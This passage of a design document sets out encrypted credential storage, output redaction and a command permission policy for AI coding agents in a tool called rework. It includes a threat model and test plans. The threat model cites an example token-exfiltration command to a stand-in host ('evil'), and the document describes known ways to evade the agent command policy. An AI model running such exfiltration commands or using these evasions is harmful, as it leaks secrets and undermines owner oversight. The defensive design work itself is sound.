(c) A command assembled across several calls (write a script, then run it). The policy
cannot see these, and the documentation says so; the owner who needs them covered adds a
`deny` rule for the script name or relies on the Docker executor.

**Editable defaults.** The list is seeded into `permission_policies` as
`subject_type='command'`, `source='default'` rows, with `matcher` JSON
(`{"kind": "argv", "argv": ["git","push"], "flags_any": ["-f","--force"]}` or
`{"kind": "sql", "verbs": ["DROP","TRUNCATE","DELETE"], "clients": ["psql","sqlite3","mysql"]}`)
and `effect=ask` by default. The owner can disable, change to `deny`, edit, or add rules
(TUI, section 9; `rework permissions rules`), and set the allowed ssh/scp hosts (default
empty, so even rewvis itself asks; `targets.toml` hosts, `targets.py:55`, are not
auto-allowed). `rework permissions reset-defaults` restores missing default rows without
touching owner edits. The command policy's "role's worktree" is the executor's `workdir`
(`nodes/tools.py:210`). The engine's own mechanical pushes (`push_branch` for the coder
branch) are trusted code, not `run_command`, and are out of this policy's scope.

**Keeping it honest.** (1) Ask on ambiguity, never allow. (2) The gate states which rule
matched, or that parsing failed, and the footer says "pattern check, not a sandbox". (3)
The test suite keeps a corpus of known evasions (script indirection, split-across-calls)
as documented `xfail` tests, so the limit is a tracked fact, not folklore. (4) The
existing `_check_leading_cd` (`nodes/tools.py:155`, called at `:200`) stays and stays
labelled advisory. (5) Nothing in rework's output or prompts says "blocked",
"contained" or "safe" about a command; it says "asked" or "denied by rule".

### 9. The TUI (`src/rework/tui/views/library.py`)

The TUI is store-only (ADR 0006), so it reads and writes the credential tables directly.
It holds the **public** key and cannot decrypt anything; there is no "reveal" action
anywhere, for anyone.

- **Add** (`library.py:404-422` builds the add `Form` of `Field`s, `_add` at `:429`; the
  type field gains `credential`). A credential form adds an `env var` field and a **masked
  `Field(kind="secret")`** (a new kind next to `"area"` in `tui/widgets/modals.py:85-91`,
  rendered with `Input(password=True)`). On submit the TUI fetches the active public key,
  checks it against the pinned fingerprint, encrypts locally, and writes the envelope
  through a new `TuiData.credential_add` beside `library_add` (`tui/data.py`). The
  plaintext is not stored in the form values after encryption. The owner sets the policy
  in the same form (below).
- **Rotate.** `r` on a credential opens the masked field only; same encrypt-and-replace.
- **Detail pane.** Name, description, how-to-use, env var, scope summary, key id,
  `rotated_at`, value state (`●●●● stored` / `no value` / `unavailable: …`). Never a
  value, last four characters, or length.
- **Policy editor.** A form over the rule (section 6): approval mode as a select
  (`never`, `first use per mission`, `every use`), effect, and projects / roles / models /
  providers / missions as pick-lists with an explicit "any". It previews the sentence the
  gate will show. The same editor serves skills, tools and the command rules (phase 3 for
  the latter two types).
- **Usage log.** A tab of `permission_audit` rows for the selected item (time, mission,
  role, redacted command, outcome), live like the other views (`Hub.guard`, ADR 0006).
- **Locked banner.** When the daemon reports a locked vault the Library view shows it.
- **Chat interception.** `tui/views/work.py:465` calls `engine.send(text)`. Before that
  call, the detector (section 5) inspects the text; on a hit the message is **not sent
  and not stored** (`OrchestratorChat.send` records at `orchestrator/chat.py:437`; the user turn
  would otherwise be in `chat_messages`). A modal offers: *Save as credential* (opens the
  masked form with the matched token prefilled and a name/policy to fill), *It's not a
  secret* (sends, with a `chat_intercept` audit row), *Cancel*. The same check guards gate
  answers typed in `tui/views/gates.py`. `OrchestratorChat.send` repeats the check as a
  backstop for other front-ends and returns an error rather than sending. Images cannot be
  scanned (limit).

### 10. Provider API keys are out of scope

Provider keys stay where they are: `api_key_env` in `models.json`
(`kernel/llm/catalog.py:33`, `:60`) and `~/.rework/rework.env`, loaded by `load_env_file`
(`config.py:21-45`) and synced to targets by the config-sync command
(`cli/__init__.py:1588-1596`). **This design does not move provider keys into the Library, does
not encrypt them, and does not put them behind the permission system.** Credentials are
what agents use for their tasks; provider keys are what rework uses to run agents. The one
interaction is defensive: provider key values are loaded into the redactor as redact-only
needles (section 5), so an agent that prints one still cannot persist it. One existing
fact is recorded, not fixed here: `role_env` copies the daemon's whole environment
(`nodes/tools.py:308`), so every `run_command` can read the provider keys the daemon
loaded. Scrubbing them from `role_env` is a separate, small decision (Alternatives).

### 11. Threat model

| protects against | how |
|---|---|
| a leaked copy of the database (file, backup, `pg_dump`) | only ciphertext; the private key is not in it |
| a model ever seeing a value | no tool returns it; env-only injection; output redacted; chat paste intercepted |
| values in logs, events, artifacts, reports, PR bodies, transcripts | redaction at the choke points in section 5 |
| a value reaching the mirrored library repo | credentials skip `write_body`; `contribute` redacts everything else |
| accidental destructive commands | the command policy asks (a speed bump) |
| an agent using a credential outside its scope or without approval | policy and gates, enforced by the engine, failing closed |
| silent use | every use has an audit row; audit failure denies |
| tampering with a ciphertext or swapping rows | AEAD with the item id in the AAD |

| does **not** protect against | why |
|---|---|
| a compromised rewvis host or a root user there | the private key and the decrypted values are in reach |
| an agent exfiltrating a value through a command it is allowed to run (`curl -d "$GH_TOKEN" evil`, `printenv > file`) | the command has the plaintext; `every_use` shows the owner the exact command, and the pre-push scan catches committed files, but policy cannot read intent |
| the plaintext env var inside the child process | readable via `/proc/<pid>/environ` by the same user, and inherited by descendants and background jobs |
| backups of the private key | `keys export` output next to a DB backup is full compromise |
| a malicious owner or operator | they set the policy |
| plaintext lingering in Python memory | `str` cannot be reliably zeroed |
| encodings the redactor does not know | section 5 limits |
| a hostile DB writer substituting the public key before a new value is entered | the TUI pins the fingerprint; the first use on a new machine is trust-on-first-use |
| shell-string tricks against the command policy | section 8; script indirection is invisible to it |
| the model provider keys | out of scope (section 10), and still inherited by `role_env` |

### 12. Migration

- **No credential exists until one is created.** Phase 1 creates empty tables and a type;
  there is no key, no row, no gate until `rework keys init` and a first add.
- **Both stores, additive.** Everything is `CREATE TABLE IF NOT EXISTS`; no existing
  table gets a column, so the check-then-alter lists (`_MIGRATIONS` at
  `library/store.py:49`, `_SQLITE_MIGRATIONS` at `:60`) are untouched. `gates` is
  unchanged. Library tables are created by `open_library_store` on both substrates
  (`:412-440`); state tables by each store's DDL.
- **A real compatibility hazard, and the order that avoids it.** `_row_to_item` does
  `ItemType(row["type"])` (`library/store.py:82`), which **raises** on a value an old
  binary does not know. A TUI on the Mac that predates this ADR would crash listing a
  Library that contains a credential. Therefore: (1) the first commit of phase 1 makes
  `_row_to_item` skip-and-log unknown types and adds the enum value; (2) it ships and
  every machine updates (`rework update`, including `--target`); (3) only then may the
  owner create a credential. A daemon older than phase 1 never sees the new tables.
- **Existing items** are unchanged: skills/tools/reports/memories, their git files and
  bodies, `tags`, `vectors`, `uses`. Default policy rows for the skill and tool types are
  seeded with `approval=never`, scope `"*"`, so current behaviour is preserved.
- **Default command rules** are seeded once with `source='default'`; re-running the seed
  inserts only missing ids.
- **Rollback.** Dropping the new tables restores today's behaviour; credential items
  without their tables become `unavailable`, never an error in listings.

### 13. Phased implementation plan

**Phase 1: storage, encryption, injection, redaction, audit.** Lands: `ItemType.CREDENTIAL`
and tolerant `_row_to_item`; `credential_keys`/`credentials`/`permission_audit` in both
stores; `rework keys init|export|import|fingerprint`; the envelope and `CredentialVault`;
`credential_add`/`rotate` for the CLI and `credential_propose`; the `Redactor` and every
hook in section 5; `PermissionExecutor` with a deliberately minimal policy (a credential
is usable only if an `allow`/`never` rule exists); the `credentials` argument on
`run_command`; the audit writes; `cryptography` as a direct dependency.

Tests (SQLite and Postgres via the store conformance suite):
- `test_envelope_roundtrip`; `test_wrong_private_key_fails_closed`;
  `test_missing_private_key_marks_unavailable_and_does_not_run`;
  `test_tampered_ciphertext_rejected`; `test_envelope_bound_to_item_id`;
  `test_unknown_envelope_version_unavailable`.
- `test_db_copy_without_key_leaks_nothing`: dump every table and the library git repo of
  a populated instance and grep for the value and its encodings: zero hits.
- `test_credential_never_in_search_read_item_mcp_get` and
  `test_credential_never_written_to_git` (`write_body` not called, `body_path` NULL).
- `test_row_to_item_skips_unknown_type`.
- Redaction: `test_redact_exact`, `_base64_all_alignments`, `_hex`, `_url_encoded`,
  `_json_escaped`, `_partial_head_tail`, `_short_value_exact_only`,
  `_binary_output_bytes_pass`, `_redacts_before_truncation` (value straddling the 4000
  char cut), `_timeout_partial_output`.
- Injection: `test_env_var_only_for_target_command` (a second command in the same role
  does not see it), `test_env_var_absent_from_transcript_events_logs_chat`,
  `test_value_not_in_command_registry_file`, `test_reserved_env_name_refused`,
  `test_audit_rows_started_finished`, `test_audit_write_failure_denies`.
- `test_no_secret_in_any_choke_point`: run a mission fixture whose command prints the
  value and assert it is absent from `events`, `runs.artifact`, `chat_messages`, log
  files, `_save_loop` output, and the rendered report.

Exit: all of the above green on both backends, plus a live run on rewvis where a real
`gh` call uses a real token and the owner confirms the token appears nowhere.

**Phase 2: policies, gates, destructive commands.** Lands: `permission_policies` and
`permission_grants`; the evaluation order of section 6; the gate path with `spec` payload,
timeout, and the orchestrator-cannot-decide rule; agent-proposed credentials through the
gate; the command policy with parsing, defaults, ambiguity rule, editing via CLI; the
pre-push diff scan.

Tests: `test_explicit_deny_beats_allow`, `test_default_deny_without_rule`,
`test_missing_scope_key_rejected`, `test_strictest_approval_wins`,
`test_first_use_per_mission_asks_once_then_allows_in_same_mission_only`,
`test_every_use_asks_each_time`, `test_policy_db_error_denies`,
`test_gate_timeout_denies_and_runs_nothing`, `test_gate_replay_reuses_same_gate`,
`test_orchestrator_cannot_decide_engine_permission_gate`,
`test_permission_gate_spec_shape_both_stores`, `test_agent_proposed_credential_needs_gate`.
Command policy: `test_git_push_force_asks`, `_push_to_main_asks`, `_reset_hard_pushed_asks`,
`_delete_remote_branch_asks`, `_rm_rf_outside_workdir_asks`, `_rm_rf_inside_workdir_passes`,
`_delete_without_where_asks`, `_delete_with_where_passes`, `_kubectl_terraform_docker_
systemctl_asks`, `_rework_update_target_asks`, `_ssh_unlisted_host_asks`,
`_ambiguous_variable_command_asks`, `_unparseable_string_asks`, `_alias_resolved`,
`_nested_bash_c_parsed`, `_editing_defaults_takes_effect`, and the `xfail` evasion corpus.
`test_push_blocked_when_diff_contains_value`.

Exit: the full matrix above green; a dogfood mission where a coder attempts a force-push
and a credentialed command, and each stops at a gate that the owner decides.

**Phase 3: skills and tools policies, TUI.** Lands: skills and tools evaluated by the same
engine (the activation gate for tools, `library/curation.py:3-7`, becomes a policy row
rather than a special case; skill/tool scope editable); the TUI work of section 9 (masked
field, rotate, policy editor, usage log, locked banner, chat interception).

Tests: `test_skill_scope_denies_other_role_at_use_not_at_search`,
`test_tool_activation_equivalent_to_policy`, existing curation tests unchanged; TUI Pilot
tests (`tests/tui/`) `test_masked_field_not_echoed`, `test_add_credential_writes_only_
ciphertext`, `test_tui_cannot_decrypt` (no private key path is read),
`test_rotate_replaces_envelope`, `test_policy_editor_roundtrip`,
`test_usage_log_lists_audit_rows`, `test_chat_paste_intercepted_before_model` (fake
provider asserts zero calls and no `chat_messages` row), `test_chat_override_logged`,
`test_public_key_change_prompts`.

Exit: ruff, ruff format, mypy (kernel is strict), the full suite on SQLite and on
Postgres (`REWORK_TEST_POSTGRES`), ADR status moved to Accepted with amendments.

## Alternatives considered

- **libsodium sealed boxes (PyNaCl).** Simple API, widely reviewed. Rejected as the
  default: a new native dependency, no AAD to bind the envelope to the item, no algorithm
  id. A fine swap if the owner prefers it; the envelope's alg byte leaves room.
- **Symmetric encryption with a key on the daemon.** Rejected by the owner's decision: the
  Mac's TUI could not add a value without holding the decryption key.
- **Encrypting the private key with a passphrase at rest.** Safer on disk, but the daemon
  must start unattended under systemd; a passphrase in an env file would be the same
  secret in the same place. Left to the owner as an export-only wrapper (`keys export`).
- **Cloud KMS or Vault.** Stronger, and a new service for a one-owner system. Not now.
- **Policy on `gates` columns.** Rejected for `spec` (section 7).
- **Scrub provider keys from `role_env`.** Cheap and valuable; outside the settled scope,
  so listed for a later decision. Phase 1 does not depend on it.
- **Deny-by-default for every unparseable command instead of ask.** Safer on paper, but
  unusable (legitimate `python -c` is common); asking matches the owner's rule.
- **Entropy-based redaction of outputs.** Rejected: destroys SHAs and hashes.

## Consequences

- Agents can do real credentialed work and the owner has an audit trail of every use.
- A model never holds a value, and a DB copy leaks nothing without the host key.
- The owner runs two new operational duties: `rework keys init` and keeping the key
  export away from DB backups. Losing the private key makes every credential
  `unavailable` until values are re-entered; that is the price of a DB copy being safe.
- Gates add latency to credentialed and destructive commands; `first_use_per_mission`
  exists to bound that.
- The command policy will have false negatives (scripts, split commands) and false
  positives (noise); both are documented, and ambiguity asks.
- `cryptography` becomes a direct dependency and the `Redactor` is on the hot path of
  every tool result; matching is one compiled regex pass, linear in output size.
- A credential type in the enum is a compatibility event for old binaries; the phase-1
  ordering in section 12 exists for it.
- The advisory jail is still advisory. Real isolation remains the Docker executor (M7).
